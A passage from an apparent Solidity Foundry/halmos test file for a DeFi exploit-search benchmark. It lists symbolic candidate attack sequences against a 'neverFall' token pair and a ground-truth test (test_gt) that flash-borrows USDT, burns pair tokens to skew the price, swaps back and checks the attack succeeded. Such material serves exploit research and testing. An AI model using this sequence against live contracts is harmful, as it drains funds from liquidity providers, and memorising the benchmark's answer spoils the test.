        vm.stopPrank();
    }

    function check_cand127(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        burn_neverFall_pair(amt5);
        swap_pair_attacker_neverFall_usdt(amt6, amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand128(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        swap_pair_attacker_neverFall_usdt(amt5, amt6);
        burn_neverFall_pair(amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand129(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        swap_pair_attacker_neverFall_usdt(amt5, amt6);
        swap_neverFall_attacker_usdt_neverFall(amt7, amt8);
        payback_neverFall_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand130(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        burn_neverFall_pair(amt5);
        swap_pair_attacker_neverFall_usdt(amt6, amt7);
        swap_neverFall_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand131(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        swap_pair_attacker_neverFall_usdt(amt5, amt6);
        swap_neverFall_attacker_usdt_neverFall(amt7, amt8);
        swap_pair_attacker_usdt_neverFall(amt9, amt10);
        payback_neverFall_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand132(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        swap_neverFall_attacker_neverFall_usdt(amt5, amt6);
        swap_pair_attacker_usdt_neverFall(amt7, amt8);
        payback_neverFall_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand133(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        swap_neverFall_attacker_neverFall_usdt(amt5, amt6);
        burn_neverFall_pair(amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand134(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        swap_neverFall_attacker_neverFall_usdt(amt5, amt6);
        swap_neverFall_attacker_usdt_neverFall(amt7, amt8);
        payback_neverFall_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand135(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        swap_neverFall_attacker_neverFall_usdt(amt5, amt6);
        swap_neverFall_attacker_usdt_neverFall(amt7, amt8);
        swap_pair_attacker_usdt_neverFall(amt9, amt10);
        payback_neverFall_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_usdt_owner(1600000e18);
        printBalance("After step0 ");
        swap_neverFall_attacker_usdt_neverFall(200000 * 1e18, 1);
        printBalance("After step1 ");
        burn_neverFall_pair(1300000 * 1e18);
        printBalance("After step2 ");
        swap_neverFall_attacker_neverFall_usdt(
            neverFall.balanceOf(attacker),
            1
        );
        printBalance("After step3 ");
        payback_usdt_owner(1600000e18);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_neverFall_attacker_neverFall_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
